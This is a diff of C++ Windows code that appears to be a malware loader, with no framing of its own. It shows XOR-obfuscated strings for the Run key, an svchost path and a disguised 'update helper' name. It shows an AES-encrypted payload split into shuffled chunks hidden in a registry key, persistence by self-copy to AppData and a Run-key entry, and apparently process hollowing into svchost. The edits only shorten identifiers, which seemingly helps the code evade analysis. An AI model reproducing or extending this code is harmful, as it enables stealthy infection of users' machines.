@@ -34,7 +34,7 @@ typedef struct _PROCESS_BASIC_INFORMATION {
     PVOID Reserved3;
 } PROCESS_BASIC_INFORMATION;
 
-unsigned char encCIDSizeMRU[] = {
+unsigned char encCIDSMRU[] = {
     0xAA, 0xF8, 0xAC, 0xC2, 0xAE, 0xC9, 0xB0, 0xC5, 0xB2, 0xC4, 0xB4, 0xD4, 0xB6, 0xC5, 0xB8, 0xDC,
     0xBA, 0xE7, 0xBC, 0xF0, 0xBE, 0xD6, 0xC0, 0xA2, 0xC2, 0xB1, 0xC4, 0xAA, 0xC6, 0xB4, 0xC8, 0xA6,
     0xCA, 0xAD, 0xCC, 0xB9, 0xCE, 0x93, 0xD0, 0x86, 0xD2, 0xBA, 0xD4, 0xBB, 0xD6, 0xB3, 0xD8, 0xB6,
@@ -45,7 +45,7 @@ unsigned char encCIDSizeMRU[] = {
     0x1A, 0x7C, 0x1C, 0x2E, 0x1E, 0x2D, 0x20, 0x7D, 0x22, 0x60, 0x24, 0x6C, 0x26, 0x63, 0x28, 0x7A,
     0x2A, 0x42, 0x2C, 0x57, 0x2E, 0x4A, 0x30, 0x7C, 0x32, 0x61, 0x34, 0x60, 0x36, 0x37
 };
-unsigned char encRunKey[] = {
+unsigned char encRunK[] = {
     0xAA, 0xF8, 0xAC, 0xC2, 0xAE, 0xC9, 0xB0, 0xC5, 0xB2, 0xC4, 0xB4, 0xD4, 0xB6, 0xC5, 0xB8, 0xDC,
     0xBA, 0xE7, 0xBC, 0xF0, 0xBE, 0xD6, 0xC0, 0xA2, 0xC2, 0xB1, 0xC4, 0xAA, 0xC6, 0xB4, 0xC8, 0xA6,
     0xCA, 0xAD, 0xCC, 0xB9, 0xCE, 0x93, 0xD0, 0x86, 0xD2, 0xBA, 0xD4, 0xBB, 0xD6, 0xB3, 0xD8, 0xB6,
@@ -54,32 +54,25 @@ unsigned char encRunKey[] = {
     0xFA, 0x95, 0xFC, 0xA1, 0xFE, 0xAD, 0x00, 0x74, 0x02, 0x6D, 0x04, 0x05
 };
 
-unsigned char encSvchostPath[] = {
+unsigned char encSvcPth[] = {
     0xAA, 0xE8, 0xAC, 0x97, 0xAE, 0xF3, 0xB0, 0xE6, 0xB2, 0xDA, 0xB4, 0xDB, 0xB6, 0xD3, 0xB8, 0xD6,
     0xBA, 0xCC, 0xBC, 0xCE, 0xBE, 0xE3, 0xC0, 0x92, 0xC2, 0xBA, 0xC4, 0xB6, 0xC6, 0xB3, 0xC8, 0xAC,
     0xCA, 0xA6, 0xCC, 0xFE, 0xCE, 0xFD, 0xD0, 0x8D, 0xD2, 0xA0, 0xD4, 0xA3, 0xD6, 0xB4, 0xD8, 0xB1,
     0xDA, 0xB4, 0xDC, 0xAE, 0xDE, 0xAB, 0xE0, 0xCF, 0xE2, 0x86, 0xE4, 0x9D, 0xE6, 0x82, 0xE8, 0xE9
 };
 
-unsigned char encUpdateHelper[] = {
-    0xAA, 0xE6, 0xAC, 0xC4, 0xAE, 0xCC, 0xB0, 0xC3, 0xB2, 0xDC, 0xB4, 0xC6, 0xB6, 0xD8, 0xB8, 0xDF,
-    0xBA, 0xCF, 0xBC, 0xE1, 0xBE, 0xE8, 0xC0, 0xA8, 0xC2, 0xAD, 0xC4, 0xA1, 0xC6, 0xA8, 0xC8, 0xBE,
-    0xCA, 0xB8, 0xCC, 0x91, 0xCE, 0x9A, 0xD0, 0xA1, 0xD2, 0xB7, 0xD4, 0xB4, 0xD6, 0xA3, 0xD8, 0xBC,
-    0xDA, 0x93, 0xDC, 0xB8, 0xDE, 0xB3, 0xE0, 0x91, 0xE2, 0x86, 0xE4, 0x97, 0xE6, 0xE7
-};
-
-unsigned char encUpdateHelperName[] = {
+unsigned char encUpHelpName[] = {
     0xAA, 0xFC, 0xAC, 0xC4, 0xAE, 0xC1, 0xB0, 0xD5, 0xB2, 0xDC, 0xB4, 0xC2, 0xB6, 0xC4, 0xB8, 0xEC,
     0xBA, 0xCB, 0xBC, 0xD9, 0xBE, 0xDE, 0xC0, 0xB5, 0xC2, 0xA6, 0xC4, 0x8D, 0xC6, 0xA2, 0xC8, 0xA5,
     0xCA, 0xBB, 0xCC, 0xA8, 0xCE, 0xBD, 0xD0, 0xD1
 };
 
-unsigned char encExplorer[] = {
+unsigned char encExp[] = {
     0xAA, 0xEE, 0xAC, 0xD5, 0xAE, 0xDF, 0xB0, 0xDD, 0xB2, 0xDC, 0xB4, 0xC7, 0xB6, 0xD2, 0xB8, 0xCB,
     0xBA, 0xBB
 };
 
-unsigned char encFolderFile[] = {
+unsigned char encFolFile[] = {
     0xAA, 0xE6, 0xAC, 0xC4, 0xAE, 0xCC, 0xB0, 0xC3, 0xB2, 0xDC, 0xB4, 0xC6, 0xB6, 0xD8, 0xB8, 0xDF,
     0xBA, 0xCF, 0xBC, 0xE1, 0xBE, 0xE8, 0xC0, 0xA8, 0xC2, 0xAD, 0xC4, 0xA1, 0xC6, 0xA8, 0xC8, 0xBE,
     0xCA, 0xB8, 0xCC, 0x91, 0xCE, 0x98, 0xD0, 0xB8, 0xD2, 0xBD, 0xD4, 0xB1, 0xD6, 0xB8, 0xD8, 0xAE,
@@ -87,18 +80,11 @@ unsigned char encFolderFile[] = {
     0xEA, 0x8E, 0xEC, 0x81, 0xEE, 0x9F, 0xF0, 0x94, 0xF2, 0x81, 0xF4, 0xDB, 0xF6, 0x92, 0xF8, 0x81,
     0xFA, 0x9E, 0xFC, 0xFD
 };
-
-unsigned char encRegValue[] = {
-    0xAA, 0xFC, 0xAC, 0xC4, 0xAE, 0xC1, 0xB0, 0xD5, 0xB2, 0xDC, 0xB4, 0xC2, 0xB6, 0xC4, 0xB8, 0xEC,
-    0xBA, 0xCB, 0xBC, 0xD9, 0xBE, 0xDE, 0xC0, 0xB5, 0xC2, 0xA6, 0xC4, 0x8D, 0xC6, 0xA2, 0xC8, 0xA5,
-    0xCA, 0xBB, 0xCC, 0xA8, 0xCE, 0xBD, 0xD0, 0xD1
-};
-
-std::wstring GetDecryptedWString(const unsigned char* encryptedData, size_t dataLen, unsigned char key = 0xAA) {
+std::wstring GetDecWString(const unsigned char* encBuf, size_t dataLen, unsigned char key = 0xAA) {
     std::vector<wchar_t> result;
     for (size_t i = 0; i + 1 < dataLen; i += 2) {
-        unsigned char b1 = encryptedData[i]     ^ (key + static_cast<unsigned char>(i));
-        unsigned char b2 = encryptedData[i + 1] ^ (key + static_cast<unsigned char>(i + 1));
+        unsigned char b1 = encBuf[i]     ^ (key + static_cast<unsigned char>(i));
+        unsigned char b2 = encBuf[i + 1] ^ (key + static_cast<unsigned char>(i + 1));
         wchar_t wc = (static_cast<wchar_t>(b1) << 8) | b2;
         if (wc == L'\0') break;
         result.push_back(wc);
@@ -141,11 +127,11 @@ bool VerPay(const std::vector<char>& pbuf, uint32_t ecrc, uint32_t esize) {
 
 bool RegFE() {
     HKEY hKey;
-    std::wstring cidPath = GetDecryptedWString(encCIDSizeMRU, sizeof(encCIDSizeMRU));
+    std::wstring cidPath = GetDecWString(encCIDSMRU, sizeof(encCIDSMRU));
     if (RegOpenKeyExW(HKEY_CURRENT_USER, cidPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
         return false;
     }
-    std::wstring iName = GetDecryptedWString(encExplorer, sizeof(encExplorer));
+    std::wstring iName = GetDecWString(encExp, sizeof(encExp));
     DWORD size = 0;
     bool indexExists = (RegQueryValueExW(hKey, iName.c_str(), NULL, NULL, NULL, &size) == ERROR_SUCCESS);
     RegCloseKey(hKey);
@@ -156,20 +142,20 @@ bool StoreFIR(const PIndex& index, const std::vector<std::vector<BYTE>>& eChks) 
 
     HKEY hKey;
     DWORD disposition;
-    std::wstring cidPath = GetDecryptedWString(encCIDSizeMRU, sizeof(encCIDSizeMRU));
+    std::wstring cidPath = GetDecWString(encCIDSMRU, sizeof(encCIDSMRU));
     if (RegCreateKeyExW(HKEY_CURRENT_USER, cidPath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, &disposition) != ERROR_SUCCESS) {
         return false;
     }
 
-    std::wstring iName = GetDecryptedWString(encExplorer, sizeof(encExplorer));
+    std::wstring iName = GetDecWString(encExp, sizeof(encExp));
     if (RegSetValueExW(hKey, iName.c_str(), 0, REG_BINARY, (BYTE*)&index, sizeof(PIndex)) != ERROR_SUCCESS) {
         RegCloseKey(hKey);
         return false;
     }
 
     for (size_t i = 0; i < eChks.size(); ++i) {
-        std::wstring chunkName = L"item" + std::to_wstring(i);
-        if (RegSetValueExW(hKey, chunkName.c_str(), 0, REG_BINARY, eChks[i].data(), (DWORD)eChks[i].size()) != ERROR_SUCCESS) {
+        std::wstring chkName = L"item" + std::to_wstring(i);
+        if (RegSetValueExW(hKey, chkName.c_str(), 0, REG_BINARY, eChks[i].data(), (DWORD)eChks[i].size()) != ERROR_SUCCESS) {
             RegCloseKey(hKey);
             return false;
         }
@@ -182,12 +168,12 @@ bool StoreFIR(const PIndex& index, const std::vector<std::vector<BYTE>>& eChks) 
 std::vector<char> LoadFFR() {
 
     HKEY hKey;
-    std::wstring cidPath = GetDecryptedWString(encCIDSizeMRU, sizeof(encCIDSizeMRU));
+    std::wstring cidPath = GetDecWString(encCIDSMRU, sizeof(encCIDSMRU));
     if (RegOpenKeyExW(HKEY_CURRENT_USER, cidPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
         return {};
     }
 
-    std::wstring iName = GetDecryptedWString(encExplorer, sizeof(encExplorer));
+    std::wstring iName = GetDecWString(encExp, sizeof(encExp));
     DWORD size = sizeof(PIndex);
     PIndex index;
     if (RegQueryValueExW(hKey, iName.c_str(), NULL, NULL, (BYTE*)&index, &size) != ERROR_SUCCESS) {
@@ -199,16 +185,16 @@ std::vector<char> LoadFFR() {
         RegCloseKey(hKey);
         return {};
     }
-    std::vector<std::vector<BYTE>> shuffledEncryptedChunks(index.ccount);
+    std::vector<std::vector<BYTE>> shEncChks(index.ccount);
     for (int i = 0; i < index.ccount; ++i) {
-        std::wstring chunkName = L"item" + std::to_wstring(i);
-        DWORD chunkSize = 0;
-        if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, NULL, &chunkSize) != ERROR_SUCCESS) {
+        std::wstring chkName = L"item" + std::to_wstring(i);
+        DWORD chkSize = 0;
+        if (RegQueryValueExW(hKey, chkName.c_str(), NULL, NULL, NULL, &chkSize) != ERROR_SUCCESS) {
             RegCloseKey(hKey);
             return {};
         }
-        shuffledEncryptedChunks[i].resize(chunkSize);
-        if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, shuffledEncryptedChunks[i].data(), &chunkSize) != ERROR_SUCCESS) {
+        shEncChks[i].resize(chkSize);
+        if (RegQueryValueExW(hKey, chkName.c_str(), NULL, NULL, shEncChks[i].data(), &chkSize) != ERROR_SUCCESS) {
             RegCloseKey(hKey);
             return {};
         }
@@ -216,15 +202,15 @@ std::vector<char> LoadFFR() {
 
     RegCloseKey(hKey);
 
-    std::vector<int> chunk_order(index.ccount);
-    for (int i = 0; i < index.ccount; ++i) chunk_order[i] = i;
+    std::vector<int> chk_order(index.ccount);
+    for (int i = 0; i < index.ccount; ++i) chk_order[i] = i;
     std::mt19937 rng(index.shseed);
-    std::shuffle(chunk_order.begin(), chunk_order.end(), rng);
+    std::shuffle(chk_order.begin(), chk_order.end(), rng);
 
     std::vector<std::vector<BYTE>> eChks(index.ccount);
-    for (int registry_pos = 0; registry_pos < index.ccount; ++registry_pos) {
-        int logical_idx = chunk_order[registry_pos];
-        eChks[logical_idx] = std::move(shuffledEncryptedChunks[registry_pos]);
+    for (int reg_pos = 0; reg_pos < index.ccount; ++reg_pos) {
+        int logical_idx = chk_order[reg_pos];
+        eChks[logical_idx] = std::move(shEncChks[reg_pos]);
     }
     std::vector<char> pbuf;
     pbuf.reserve(index.tsize + 1024);
@@ -236,14 +222,14 @@ std::vector<char> LoadFFR() {
 
     BYTE aes_key[32] = {0};
     for (int i = 0; i < 32; i++) aes_key[i] = index.fkey ^ (i * 0x11);
-    BYTE last_cipher_block[16] = {0};
+    BYTE lst_ciph_blk[16] = {0};
 
     for (int i = 0; i < index.ccount; ++i) {
-        const auto& encrypted_data = eChks[i];
-        DWORD chunk_size = (DWORD)encrypted_data.size();
+        const auto& enc_buf = eChks[i];
+        DWORD chunk_size = (DWORD)enc_buf.size();
 
         BYTE iv[16] = {0};
-        if (i > 0) memcpy(iv, last_cipher_block, 16);
+        if (i > 0) memcpy(iv, lst_ciph_blk, 16);
 
         struct {
             BLOBHEADER hdr;
@@ -270,7 +256,7 @@ std::vector<char> LoadFFR() {
         }
 
         std::vector<BYTE> decbuf(chunk_size);
-        memcpy(decbuf.data(), encrypted_data.data(), chunk_size);
+        memcpy(decbuf.data(), enc_buf.data(), chunk_size);
         DWORD out_len = chunk_size;
 
         if (!CryptDecrypt(hKey, 0, FALSE, 0, decbuf.data(), &out_len)) {
@@ -282,7 +268,7 @@ std::vector<char> LoadFFR() {
         CryptDestroyKey(hKey);
 
         if (chunk_size >= 16) {
-            memcpy(last_cipher_block, encrypted_data.data() + chunk_size - 16, 16);
+            memcpy(lst_ciph_blk, enc_buf.data() + chunk_size - 16, 16);
         }
 
         if (out_len > 0) {
@@ -348,41 +334,41 @@ std::pair<PIndex, std::vector<std::vector<BYTE>>> LoadEFR() {
     return {*idx, eChks};
 }
 
-bool CheckPersistence() {
-    std::wstring runKeyPath = GetDecryptedWString(encRunKey, sizeof(encRunKey));
-    std::wstring regValueName = GetDecryptedWString(encUpdateHelperName, sizeof(encUpdateHelperName));
+bool ChckPrs() {
+    std::wstring runKPth = GetDecWString(encRunK, sizeof(encRunK));
+    std::wstring regVNm = GetDecWString(encUpHelpName, sizeof(encUpHelpName));
     HKEY hKey;
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, runKeyPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, runKPth.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
         return false;
     }
     DWORD size = 0;
-    bool exists = (RegQueryValueExW(hKey, regValueName.c_str(), NULL, NULL, NULL, &size) == ERROR_SUCCESS);
+    bool exists = (RegQueryValueExW(hKey, regVNm.c_str(), NULL, NULL, NULL, &size) == ERROR_SUCCESS);
     RegCloseKey(hKey);
     return exists;
 }
 
 bool CopySTPL() {
-    std::wstring runKeyPath = GetDecryptedWString(encRunKey, sizeof(encRunKey));
-    std::wstring regValueName = GetDecryptedWString(encUpdateHelperName, sizeof(encUpdateHelperName));
-    std::wstring folderFile = GetDecryptedWString(encUpdateHelper, sizeof(encUpdateHelper));
-    wchar_t currentPath[MAX_PATH], appDataPath[MAX_PATH], targetPath[MAX_PATH];
-    GetModuleFileNameW(NULL, currentPath, MAX_PATH);
-    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
-    wcscpy_s(targetPath, appDataPath);
-    PathAppendW(targetPath, folderFile.c_str());
+    std::wstring runKPth = GetDecWString(encRunK, sizeof(encRunK));
+    std::wstring regVNm = GetDecWString(encUpHelpName, sizeof(encUpHelpName));
+     std::wstring foldFle = GetDecWString(encFolFile, sizeof(encFolFile));
+    wchar_t currPth[MAX_PATH], appDPath[MAX_PATH], tgtPath[MAX_PATH];
+    GetModuleFileNameW(NULL, currPth, MAX_PATH);
+    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDPath);
+    wcscpy_s(tgtPath, appDPath);
+    PathAppendW(tgtPath, foldFle.c_str());
     wchar_t dirPath[MAX_PATH];
-    wcscpy_s(dirPath, targetPath);
+    wcscpy_s(dirPath, tgtPath);
     PathRemoveFileSpecW(dirPath);
     SHCreateDirectoryExW(NULL, dirPath, NULL);
-    if (_wcsicmp(currentPath, targetPath) != 0) {
-        if (CopyFileW(currentPath, targetPath, FALSE)) {
+    if (_wcsicmp(currPth, tgtPath) != 0) {
+        if (CopyFileW(currPth, tgtPath, FALSE)) {
         } else {
         }
     }
     HKEY hKey;
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, runKeyPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        std::wstring value = L"\"" + std::wstring(targetPath) + L"\"";
-        if (RegSetValueExW(hKey, regValueName.c_str(), 0, REG_SZ,
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, runKPth.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        std::wstring value = L"\"" + std::wstring(tgtPath) + L"\"";
+        if (RegSetValueExW(hKey, regVNm.c_str(), 0, REG_SZ,
                            (BYTE*)value.c_str(), (DWORD)(value.length() * sizeof(wchar_t))) == ERROR_SUCCESS) {
             RegCloseKey(hKey);
             return true;
@@ -393,7 +379,7 @@ bool CopySTPL() {
 }
 
 std::vector<char> RecFWRP() {
-    if (!CheckPersistence()) {
+    if (!ChckPrs()) {
         CopySTPL();
     } else {
     }
@@ -483,7 +469,7 @@ bool Start(char* payload, uint32_t payloadSize) {
     if (nt->Signature != IMAGE_NT_SIGNATURE) {
         return false;
     }
-    std::wstring hostPathW = GetDecryptedWString(encSvchostPath, sizeof(encSvchostPath));
+    std::wstring hostPathW = GetDecWString(encSvcPth, sizeof(encSvcPth));
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     if (!CreateProcessW(NULL, (LPWSTR)hostPathW.c_str(), NULL, NULL, FALSE,
